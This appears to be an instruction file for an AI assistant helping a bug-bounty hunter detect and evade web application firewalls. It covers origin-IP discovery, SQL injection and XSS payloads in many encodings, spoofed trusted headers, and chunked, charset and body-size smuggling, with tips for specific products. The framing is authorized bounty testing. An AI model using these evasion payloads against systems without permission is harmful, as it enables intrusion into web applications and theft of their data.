---
description: "WAF detection and evasion methodology. TRIGGER: payloads triggering 403/406/451 responses, custom WAF block pages, or signature-based filtering masking an underlying vulnerability (SQLi, XSS, SSRF, RCE, SSTI). WAF bypass alone is NOT reportable — must always be combined with the underlying vuln."
---

# /waf-bypass — WAF Detection & Evasion

You are assisting **Liodeus (YesWeHack)**. WAF bypass is a **technique**, not a finding. The bounty is in the underlying vulnerability — the bypass is the proof that the WAF wasn't a real control.

## Core Philosophy

* **No underlying vuln = no report.** If you bypass the WAF but nothing fires server-side, log `[DEAD-END]` and move on.
* **WAF bypass alone is informative.** Programs close standalone "I bypassed Cloudflare" reports. Always chain to a confirmed vuln.
* **Try infrastructure bypass before payload obfuscation.** A reachable origin makes the WAF irrelevant. Don't burn 50 encoding variants when a `staging.target.com` lookup solves it.
* **Iterate in Caido, not curl.** Every variant lands in the project history — replayable, comparable, audit-trailed.

## Always-ignore on its own
* "I bypassed the WAF" reports without a confirmed underlying vuln behind it.
* Generic encoding tricks against a strict WAF without observable backend execution.
* Techniques the program publicly documents in their own hardening blog (informative).

## Tooling

Use the **Caido MCP** for iterative payload testing — every variant lands in the project history, side-by-side replayable. Don't curl variants out-of-band; you'll lose the audit trail. If a payload needs JS-rendered context (DOM XSS through a CDN WAF), drive **Playwright** so the browser routes through Caido.

## Quick Reference

### WAF Detection
| Indicator | Product |
|---|---|
| `cf-ray:` header, `__cfduid` cookie | Cloudflare |
| `x-amzn-requestid:` + WAF block page | AWS WAF |
| `x-iinfo:` header | Imperva / Incapsula |
| `AIDV` cookie | Akamai |
| `mod_security` in error body | ModSecurity |
| `x-sucuri-id:` header | Sucuri |
| `IIS` + WAF block | Barracuda |

### Common Bypasses (cheat sheet)
```
URL encoding:    ' → %27, double: %2527
Case:            <ScRiPt>, SeLeCt
Whitespace:      SELECT/**/FROM, SELECT%09FROM (tab), SELECT%0aFROM (newline)
Content-Type:    text/plain instead of application/json
Method swap:     GET ↔ POST, X-HTTP-Method-Override
Path:            /admin//users, /admin/./users, /%61dmin/users
Chunked:         split payload across chunks
HPP:             q=safe&q=payload (WAF inspects first, backend uses last)
Body-size:       pad junk past WAF inspection window
```

## Signal Stops

| Signal | Action |
|---|---|
| Bypass passes AND underlying vuln executes | **STOP — report combining bypass + underlying vuln** |
| WAF product identified from headers/error | **STOP generic spray** — switch to product-specific section |
| 3 encoding variants all 403/406 | **PIVOT** — try Content-Type / method switch / chunked |
| WAF bypassed but underlying vuln doesn't fire | **PIVOT — log `[DEAD-END]`, no finding** |
| Origin reachable directly | **STOP** WAF work — test underlying vuln on origin, document infra bypass |

---

## Methodology

### Phase 0 — Try infrastructure bypass first

Before any payload obfuscation, attempt to reach the origin directly. If you can, the WAF is irrelevant.

**Origin discovery:**
* Historical DNS (SecurityTrails, PassiveTotal) — pre-CDN IPs
* Favicon hash → Shodan / Censys
* SPF records (`dig TXT target.com`) — mail server IPs may share a /24 with origin
* Apex-domain gap — test `target.com` if only `www.target.com` is proxied
* Staging / legacy hosts — `staging.target.com`, `dev.target.com`, `old.target.com`

**Trust-based exclusion** — if the WAF relaxes for cloud ASNs or corporate proxies:
* Proxify request through AWS / GCP / Azure exit
* Add `X-Forwarded-For: <trusted-cloud-IP>`

If origin is reachable → test underlying vuln there. Document the infra bypass in the report.

### Phase 1 — Detect the WAF

Send a noisy payload through Caido:
```
?id=' OR 1=1--
```
Observe the response:
* **403 / 406 / 451** + custom block page → WAF blocking
* **Same 200, empty body** → application-level filtering, not WAF
* **Different latency** with same status → WAF in detection-only / log-only mode (still worth bypassing)

### Phase 2 — Identify the WAF product

Check headers, cookies, error body. Match against the detection table above. **Stop spraying generic bypasses once identified** — go straight to the product-specific section in Phase 4.

### Phase 3 — Apply bypass techniques

Apply in roughly this order. Iterate in the Caido replay tab so every variant is preserved and comparable.

#### 3.1 URL Encoding
```
Original:  ' OR 1=1--
Single:    %27%20OR%201%3D1--
Double:    %2527%2520OR%25201%253D1--
```

#### 3.2 Case Manipulation
```
<script>alert(1)</script>   →   <ScRiPt>alert(1)</ScRiPt>
SELECT                       →   SeLeCt, sElEcT
```

#### 3.3 Whitespace Substitution
```
SELECT * FROM users
→ SELECT/**/*/**/FROM/**/users
→ SELECT%09*%09FROM%09users   (tab)
→ SELECT%0a*%0aFROM%0ausers   (newline)
```

#### 3.4 Content-Type Misdirection
```
POST /search
Content-Type: text/plain

q=' OR 1=1--

(WAF may only inspect application/json or x-www-form-urlencoded)
```

#### 3.5 HTTP Method Switching
```
POST blocked → try GET, PUT, DELETE
Or override:  X-HTTP-Method-Override: GET
```

#### 3.6 Path Obfuscation
```
/admin/users  →  /admin//users
              →  /admin/./users
              →  /admin/%2fusers
              →  /admin;/users
              →  /%61dmin/users      (URL-encoded 'a')
```

#### 3.7 Trusted-Header Injection
WAF often trusts certain headers as already-validated:
```
X-Forwarded-For:    127.0.0.1
X-Real-IP:          127.0.0.1
X-Originating-IP:   127.0.0.1
True-Client-IP:     127.0.0.1

URL override:
X-Original-URL:     /admin
X-Rewrite-URL:      /admin
```

#### 3.8 Chunked Transfer Encoding
```
POST /search HTTP/1.1
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

3
q=%
4
27+O
4
R+1%
4
3D1-
1
-
0

(WAF may not reassemble chunks; backend does)
```

#### 3.9 HTTP Parameter Pollution (HPP)
```
POST /search
q=safe_value&q=' OR 1=1--

(WAF inspects first, backend uses last — or vice versa)
```

#### 3.10 Character Encoding
```
HTML entity (XSS):   <img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
Unicode (JS):        <img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
Octal (JS):          <img src=x onerror="\141\154\145\162\164(1)">
Hex (JS):            <img src=x onerror="\x61\x6c\x65\x72\x74(1)">
Hex in SQL:          SELECT 0x61646d696e   (= 'admin')
```

#### 3.11 Body-Size Limit Bypass
WAFs skip inspection above their body-size limit; the backend still processes the full body.

| WAF | Inspection limit |
|---|---|
| Cloudflare | 128 KB |
| AWS WAF | 8–64 KB |
| Azure | 128 KB – 2 MB |
| FortiWeb | 100 MB |

```
POST /search
Content-Type: application/x-www-form-urlencoded

junk=AAAA[...repeat past WAF limit...]&q=' OR 1=1--
```

#### 3.12 Charset Encoding (IBM037 trick)
WAF reads body as UTF-8 (garbage to it). Backend decodes IBM037 → valid payload.
```
Content-Type: application/x-www-form-urlencoded; charset=ibm037
Body: [IBM037-encoded payload]
```

#### 3.13 Multipart Manipulation
* **Boundary confusion** — semicolon injection in the boundary string
* **`multipart/mixed` stacking** — nested inner payload the WAF doesn't recurse into
* **Chunked + multipart combo** — dual reassembly mismatch

### Phase 4 — Product-specific strategies

**Cloudflare**
* Split payload across headers + body
* Non-standard custom headers for injection sinks
* `%u`-unicode escaping in JS contexts
* SQLi: MySQL version comments — `/*!50000SELECT*/`

**AWS WAF**
* Case-sensitivity exploits (many rules are case-sensitive)
* Extra whitespace + SQL comment injection
* JSON array pollution — `{"key": ["normal", "payload"]}`

**ModSecurity (CRS)**
* Multiple encoding rounds (CRS often decodes once)
* MySQL conditional comments — `/*!50000 ... */`

**Imperva / Incapsula**
* Switch data format — JSON ↔ form-encoded
* HTTP/2 handling often diverges from HTTP/1

### Phase 5 — Document the bypass in the report

WAF bypass without an underlying vuln is not a finding. The report combines both:

```
Underlying vulnerability:  SQL Injection in /search?q=
WAF detected:              Cloudflare (cf-ray header)
Bypass method:             Double URL encoding (%2527 instead of ')
Combined severity:         WAF was the only control — bypass = full exploitability
```

Hand off to `/write-report-yeswehack` with both pieces — vuln + bypass technique — in the same submission.
